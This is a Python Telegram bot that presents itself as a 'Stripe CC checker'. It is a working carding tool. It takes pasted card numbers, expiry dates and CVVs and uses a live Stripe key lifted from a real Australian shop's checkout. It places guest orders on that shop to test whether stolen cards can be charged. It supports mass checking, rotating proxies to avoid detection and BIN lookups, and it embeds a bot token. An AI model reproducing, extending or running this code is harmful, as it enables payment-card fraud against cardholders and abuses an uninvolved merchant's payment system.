import asyncio
import json
import random
import re
import string
import time
import aiofiles
import aiohttp
import uuid
import httpx
from datetime import datetime
from urllib.parse import urlencode
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import logging
import os

# ============================================================================
# 1. GLOBAL CONFIGURATION
# ============================================================================

BOT_TOKEN = "8463844539:AAHkM3Zdt3XeUMZYNQT6dwfCKrzpegRpIn8"
OWNER = "R@ven"

# Global variables
stop_sessions = {}
proxies = []

# ============================================================================
# 2. YOUR EXACT CONSOLE SCRIPT LOGIC - ASYNC VERSION
# ============================================================================

async def create_payment_method_async(card_details, proxy=None):
    """EXACTLY from your console script - Async version"""
    try:
        stripe_url = 'https://api.stripe.com/v1/payment_methods'
        
        stripe_headers = {
            'accept': 'application/json',
            'accept-language': 'en-GB',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }

        stripe_data = {
            'billing_details[address][state]': 'SA',
            'billing_details[address][postal_code]': '1234',
            'billing_details[address][country]': 'AU',
            'billing_details[address][city]': 'Hivug',
            'billing_details[address][line1]': 'New',
            'billing_details[address][line2]': 'York',
            'billing_details[email]': 'khatrieex@gmail.com',
            'billing_details[name]': 'Diwas Khatri',
            'billing_details[phone]': '875444',
            'type': 'card',
            'allow_redisplay': 'unspecified',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element; deferred-intent; autopm',
            'referrer': 'https://www.livingponds.com.au',
            'time_on_page': '150658',
            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
            'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'key': 'pk_live_51QBpW3CSUyWFRv1F1BlrlZOjar9z8cVx4CzPIpEqe1P6vQGvBD5BwSwm998v51I7xVMj3G7YzMKiOwNfYCxw0wCq00xySSFhML',
            '_stripe_version': '2020-03-02',
        }
        
        stripe_data.update({
            'card[number]': card_details['number'],
            'card[cvc]': card_details['cvc'],
            'card[exp_year]': card_details['exp_year'],
            'card[exp_month]': card_details['exp_month'],
            'guid': str(uuid.uuid4()),
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
        })
        
        encoded_data = urlencode(stripe_data)

        timeout = aiohttp.ClientTimeout(total=30)
        connector = aiohttp.TCPConnector()
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            async with session.post(stripe_url, headers=stripe_headers, data=encoded_data) as response:
                response_text = await response.text()
                if response.status == 200:
                    response_json = json.loads(response_text)
                    payment_method_id = response_json.get('id')
                    if not payment_method_id:
                        error_msg = response_json.get('error', {}).get('message', 'Unknown Stripe error')
                        return None, f"STRIPE: {error_msg}"
                    return payment_method_id, "STRIPE_OK"
                else:
                    error_text = response_text[:100] if response_text else f"HTTP {response.status}"
                    return None, f"STRIPE_FAIL: {error_text}"
        
    except Exception as e:
        return None, f"ERROR: {str(e)[:100]}"

async def place_order_async(payment_method_id, proxy=None):
    """EXACTLY from your console script - Async version"""
    try:
        cart_id = 'NbH2uDAvDyurRfoXVQ1PFTCvsSEHTA3J'
        order_url = f'https://www.livingponds.com.au/rest/default/V1/guest-carts/{cart_id}/payment-information'
        
        merchant_headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://www.livingponds.com.au',
            'referer': 'https://www.livingponds.com.au/checkout/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        merchant_json = {
            'cartId': cart_id,
            'billingAddress': {
                'countryId': 'AU',
                'regionId': '609',
                'street': ['New', 'York'],
                'telephone': '875444',
                'postcode': '1234',
                'city': 'Hivug',
                'firstname': 'Diwas',
                'lastname': 'Khatri'
            },
            'paymentMethod': {
                'method': 'stripe_payments',
                'additional_data': {'payment_method': payment_method_id}
            },
            'email': 'khatrieex@gmail.com',
        }

        timeout = aiohttp.ClientTimeout(total=30)
        connector = aiohttp.TCPConnector()
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            async with session.post(order_url, headers=merchant_headers, json=merchant_json) as response:
                response_text = await response.text()
                if response.status == 200:
                    return True, "CHARGE_SUCCESS"
                else:
                    error_text = response_text[:150] if response_text else f"HTTP {response.status}"
                    return False, f"ORDER_FAILED: {error_text}"
            
    except Exception as e:
        return False, f"ORDER_ERROR: {str(e)[:100]}"

# ============================================================================
# 3. CARD CHECKING FUNCTION
# ============================================================================

async def check_card_async(card_input, proxy=None):
    """Use your exact console script logic"""
    # Parse card
    card_parts = card_input.strip().split('|')
    
    if len(card_parts) < 4:
        return {
            'status': 'INVALID',
            'message': 'Invalid format! Use: 4242424242424242|12|25|123',
            'time': datetime.now().strftime("%H:%M:%S")
        }
    
    # Format year properly
    year = card_parts[2].strip()
    if len(year) == 2:
        year = '20' + year
    
    card_details = {
        'number': card_parts[0].strip(),
        'exp_month': card_parts[1].strip(),
        'exp_year': year,
        'cvc': card_parts[3].strip()
    }
    
    # Step 1: Create Stripe payment method
    start_time = time.time()
    payment_method_id, stripe_result = await create_payment_method_async(card_details, proxy)
    
    if payment_method_id:
        # Step 2: Place order
        order_success, order_result = await place_order_async(payment_method_id, proxy)
        
        if order_success:
            # Map: LIVE → CHARGED (from console script to Telegram bot)
            status = "CHARGED"
            message = "CHARGE_SUCCESS"
        else:
            # Map: DEAD → DECLINED
            status = "DECLINED"
            message = order_result
    else:
        status = "DECLINED"
        message = stripe_result
    
    time_taken = time.time() - start_time
    card_str = f"{card_details['number']}|{card_parts[1].strip()}|{year[-2:]}|{card_details['cvc']}"
    
    return {
        'card': card_str,
        'status': status,  # CHARGED or DECLINED
        'message': message,
        'gateway': 'Stripe',
        'time': datetime.now().strftime("%H:%M:%S"),
        'time_taken': f"{time_taken:.2f}s",
        'bin': card_details['number'][:6]
    }

# ============================================================================
# 4. PROXY MANAGEMENT
# ============================================================================

def parse_proxy_line(line: str):
    """Parse proxy line"""
    line = line.strip()
    if not line:
        return None
    
    parts = line.split(':')
    if len(parts) == 4:
        ip, port, username, password = parts
        return {
            'http': f'http://{username}:{password}@{ip}:{port}',
            'https': f'http://{username}:{password}@{ip}:{port}',
            'raw': line,
            'host': ip,
            'port': port
        }
    elif len(parts) == 2:
        ip, port = parts
        return {
            'http': f'http://{ip}:{port}',
            'https': f'http://{ip}:{port}',
            'raw': line,
            'host': ip,
            'port': port
        }
    return None

async def load_proxies_from_file(filename: str = "proxies.txt"):
    """Load proxies from file"""
    global proxies
    try:
        async with aiofiles.open(filename, 'r') as f:
            content = await f.read()
            lines = content.strip().split('\n')
            for line in lines:
                proxy = parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
        logging.info(f"Loaded {len(proxies)} proxies from {filename}")
    except Exception as e:
        logging.error(f"Failed to load proxies: {e}")

async def save_proxies_to_file(filename: str = "proxies.txt"):
    """Save proxies to file"""
    try:
        async with aiofiles.open(filename, 'w') as f:
            for proxy in proxies:
                await f.write(f"{proxy['raw']}\n")
    except Exception as e:
        logging.error(f"Failed to save proxies: {e}")

def get_random_proxy():
    """Get random proxy"""
    if not proxies:
        return None
    return random.choice(proxies)

# ============================================================================
# 5. YOUR TELEGRAM FUNCTIONS (NO CHANGES)
# ============================================================================

async def get_bin_info(bin_number):
    """Get BIN information from antipublic.cc API"""
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            response = await client.get(f"https://bins.antipublic.cc/bins/{bin_number}")
            if response.status_code == 200:
                data = response.json()
                return {
                    'bin': data.get('bin', 'N/A'),
                    'brand': data.get('brand', 'Unknown'),
                    'type': data.get('type', 'Unknown'),
                    'bank': data.get('bank', 'Unknown'),
                    'country': data.get('country_name', data.get('country', 'Unknown')),
                    'scheme': data.get('scheme', 'Unknown'),
                    'level': data.get('level', 'Unknown')
                }
    except Exception as e:
        print(f"BIN lookup error: {e}")
    return None
     
def extract_cc(text):
    """Extract CC from message"""
    patterns = [
        r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3})',
        r'(\d{16})\s+(\d{2})\s+(\d{2,4})\s+(\d{3})',
        r'(\d{16})\|(\d{2})/(\d{2,4})/(\d{3})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            cc = match.group(1)
            month = match.group(2)
            year = match.group(3)
            cvv = match.group(4)
            
            if len(year) == 4:
                year = year[-2:]
            
            return {
                'cc': cc,
                'month': month,
                'year': year,
                'cvv': cvv,
                'string': f"{cc}|{month}|{year}|{cvv}",
                'bin': cc[:6]
            }
    return None

def format_single_response(check_result, cc_data, bin_info):
    """Format response"""
    full_card = cc_data['string']
    status = check_result.get('status', 'FAILED').upper()
    response_text = check_result.get('message', 'Payment failed')
    gateway = check_result.get('gateway', 'Stripe')
    current_time = check_result.get('time', datetime.now().strftime("%H:%M:%S"))

    if isinstance(bin_info, dict):
        brand = bin_info.get('brand', 'N/A')
        card_type = bin_info.get('type', 'N/A')
        level = bin_info.get('level', None)
        info = f"{brand} - {card_type}"
        if level:
            info += f" - {level}"

        bank = bin_info.get('bank', 'N/A')
        country_name = bin_info.get('country_name') or bin_info.get('country') or 'N/A'
        country_flag = bin_info.get('country_flag', '🏳️')
        country = f"{country_name} - [{country_flag}]"
    else:
        info = "N/A"
        bank = "N/A"
        country = "N/A"

    response = f"""CC : {full_card}
Status : {status}
Response : {response_text}
Gateway : {gateway}  
Info : {info}
Bank : {bank}
Country : {country}
T/t : {current_time}
User : {OWNER}
"""
    return response

def generate_session_id(length=8):
    """Generate session ID"""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

# ============================================================================
# 6. TELEGRAM COMMAND HANDLERS (WITH FIXED /stop)
# ============================================================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    welcome_text = f"""
╔══════════════════════╗
║   STRIPE CC CHECKER  ║
╚══════════════════════╝

Commands:
Single card check  -  /chk CC|MM|YY|CVV
Mass check  -  /mchk (cards in same message)
Add proxies  -  /addproxies (paste proxy list)
Show proxies  -  /proxies
Stop session  -  /stop SESSION_ID

Bot By: {OWNER}
"""
    await update.message.reply_text(welcome_text)

async def addproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command to add proxies"""
    text = update.message.text.replace('/addproxies', '').strip()
    
    if not text:
        await update.message.reply_text("""Send proxies in format:
/addproxies
ip:port:user:pass
ip:port:user:pass""")
        return
    
    lines = text.split('\n')
    added = 0
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        proxy = parse_proxy_line(line)
        if proxy:
            if not any(p['raw'] == proxy['raw'] for p in proxies):
                proxies.append(proxy)
                added += 1
    
    await save_proxies_to_file()
    await update.message.reply_text(f"✅ Added {added} proxies. Total: {len(proxies)}")

async def proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command to show proxies"""
    if not proxies:
        await update.message.reply_text("No proxies loaded. Use /addproxies")
        return
    
    message = f"📊 Loaded Proxies: {len(proxies)}\n\n"
    for i, proxy in enumerate(proxies[:10], 1):
        message += f"{i}. `{proxy['raw']}`\n"
    
    if len(proxies) > 10:
        message += f"\n... and {len(proxies) - 10} more"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command"""
    text = update.message.text.replace('/chk', '').strip()
    
    if not text:
        await update.message.reply_text("""⚠️ Missing Card Details
Usage Options:
1️⃣ Direct command: /chk 4242424242424242|12|25|123
2️⃣ Reply to message: Reply to any message containing card details with /chk

💡 Supported Formats:
card|mm|yy|cvv
card/mm/yy/cvv
card:mm:yy:cvv""")
        return
    
    cc_data = extract_cc(text)
    
    if not cc_data:
        await update.message.reply_text("""⚠️ Invalid Card Format
Usage Options:
1️⃣ Direct command: /chk 4242424242424242|12|25|123
2️⃣ Reply to message: Reply to any message containing card details with /chk

💡 Supported Formats:
card|mm|yy|cvv
card/mm/yy/cvv
card:mm:yy:cvv""")
        return
    
    msg = await update.message.reply_text("⌛ Checking card...")
    
    bin_info = await get_bin_info(cc_data['bin'])
    proxy = get_random_proxy()
    result = await check_card_async(cc_data['string'], proxy)
    
    response = format_single_response(result, cc_data, bin_info)
    await msg.edit_text(response)

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mchk command - WITH FIXED /stop"""
    
    if update.message.reply_to_message:
        replied_text = update.message.reply_to_message.text
    else:
        replied_text = update.message.text.replace('/mchk', '').strip()
    
    if not replied_text:
        await update.message.reply_text("""⚠️ Missing Card Details
Usage Options:
1️⃣ Direct command: /mchk 
4242424242424242|12|25|123
5555555555554444|06|26|456

2️⃣ Reply to message: Reply to any message containing cards with /mchk

💡 Supported Formats:
card|mm|yy|cvv
card/mm/yy/cvv
card:mm:yy:cvv""")
        return

    lines = replied_text.split('\n')
    cards = []
    for line in lines:
        cc_data = extract_cc(line.strip())
        if cc_data:
            cards.append(cc_data)

    if not cards:
        await update.message.reply_text("""⚠️ No Valid Cards Found
Usage Options:
1️⃣ Direct command: /mchk 
4242424242424242|12|25|123
5555555555554444|06|26|456

2️⃣ Reply to message: Reply to any message containing cards with /mchk

💡 Supported Formats:
card|mm|yy|cvv
card/mm/yy/cvv
card:mm:yy:cvv""")
        return

    total = len(cards)
    approved = 0
    declined = 0
    charged = 0
    errors = 0
    start_time = datetime.now()
    session_id = generate_session_id()
    user_name = getattr(update.message.from_user, 'first_name', 'Unknown') or "Unknown"

    # FIX: Use session_id as key
    stop_sessions[session_id] = False

    status_msg = await update.message.reply_text(f"""
⩙ Status ↬ Processing 📊 
⊀ Session ID ↬ {session_id}
⊀ Gateway ↬ Stripe Charge
⊀ Total Cards ↬ {total}
⊀ Checked ↬ 0 / {total} (0%)
⊀ Charged 🔥 ↬ 0
⊀ Approved ✅ ↬ 0
⊀ Declined ❌ ↬ 0
⊀ Error Cards ⚠️ ↬ 0
⌬ Stop Command ↬ /stop {session_id}
⌬ Dev ↬ {OWNER}
""")

    for i, card in enumerate(cards, 1):
        # FIX: Check stop signal
        if stop_sessions.get(session_id):
            await update.message.reply_text(f"🛑 Session {session_id} stopped by user.")
            break

        try:
            proxy = get_random_proxy()
            result = await check_card_async(card['string'], proxy)
            status = result['status'].upper()

            if "CHARGED" in status:
                charged += 1
                approved += 1
                
                bin_info = await get_bin_info(card['bin'])
                response_box = f"""
CC : = {card['string']}
Status : = {result.get('status', '')}
Response : = {result.get('message', '')}
Gate : = Stripe
Bin : = {card['bin']}
Info : = {(bin_info.get('brand', 'N/A') + ' ' + bin_info.get('type', 'N/A')) if bin_info else 'N/A'}
Bank : = {bin_info.get('issuer', 'N/A') if bin_info else 'N/A'}
Country : = {bin_info.get('country', 'N/A') if bin_info else 'N/A'}
T/t : = {result.get('time', '')}
User : = {user_name}
"""
                await update.message.reply_text(response_box.strip())
                
            elif "DECLINED" in status:
                declined += 1
            else:
                errors += 1

        except Exception:
            errors += 1

        checked_pct = int((i / total) * 100)
        elapsed = datetime.now() - start_time
        minutes, seconds = divmod(elapsed.seconds, 60)
        await status_msg.edit_text(f"""
⩙ Status ↬ Processing 📊 
⊀ Session ID ↬ {session_id}
⊀ Gateway ↬ Stripe
⊀ Total Cards ↬ {total}
⊀ Checked ↬ {i} / {total} ({checked_pct}%)
⊀ Charged 🔥 ↬ {charged}
⊀ Approved ✅ ↬ {approved}
⊀ Declined ❌ ↬ {declined}
⊀ Error Cards ⚠️ ↬ {errors}
⌬ Stop Command ↬ /stop {session_id}
⌬ Dev ↬ {OWNER}
""")
        await asyncio.sleep(30)

    elapsed = datetime.now() - start_time
    minutes, seconds = divmod(elapsed.seconds, 60)
    await status_msg.edit_text(f"""
⩙ Summary ↬ 𝙁𝙞𝙣𝙖𝙡 𝙎𝙩𝙖𝙩𝐮𝙨 ✅
⊀ Session ID ↬ {session_id}
⊀ Gateway ↬ Stripe
⊀ Total Cards ↬ {total}
⊀ Checked ↬ {total} / {total}
⊀ Charged 🔥 ↬ {charged}
⊀ Approved ✅ ↬ {approved}
⊀ Declined ❌ ↬ {declined}
⊀ Error Cards ⚠️ ↬ {errors}
⊀ Time ↬ ⏱️ {minutes:02}:{seconds:02}
⊀ Checked By ↬ {user_name}
⌬ Dev ↬ {OWNER}
""")

    # FIX: Clean up session
    if session_id in stop_sessions:
        del stop_sessions[session_id]

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop a running session: /stop SESSION_ID - FIXED"""
    if not context.args:
        await update.message.reply_text("❌ Usage: /stop SESSION_ID\nExample: /stop FDAF4210")
        return
    
    session_id = context.args[0].upper()
    
    # FIX: Set stop signal for this session
    if session_id in stop_sessions:
        stop_sessions[session_id] = True
        await update.message.reply_text(f"✅ Session {session_id} will stop after current card.")
    else:
        await update.message.reply_text(f"❌ Session {session_id} not found or already completed.")

# ============================================================================
# 7. MAIN FUNCTION
# ============================================================================

async def load_initial_data():
    """Load initial data on startup"""
    await load_proxies_from_file()
    logging.info(f"Bot started with {len(proxies)} proxies")

def main():
    """Main function"""
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    
    # Load initial data
    asyncio.run(load_initial_data())
    
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CommandHandler("mchk", mchk_command))
    app.add_handler(CommandHandler("addproxies", addproxies_command))
    app.add_handler(CommandHandler("proxies", proxies_command))
    app.add_handler(CommandHandler("stop", stop_command))
    
    print("🤖 Stripe Telegram Bot Starting...")
    print(f"💰 Actual charges on: livingponds.com.au")
    print(f"📊 Proxies: {len(proxies)} loaded")
    print("✅ Bot is running. Press Ctrl+C to stop.")
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nBot stopped by user")
    except Exception as e:
        print(f"Fatal error: {e}")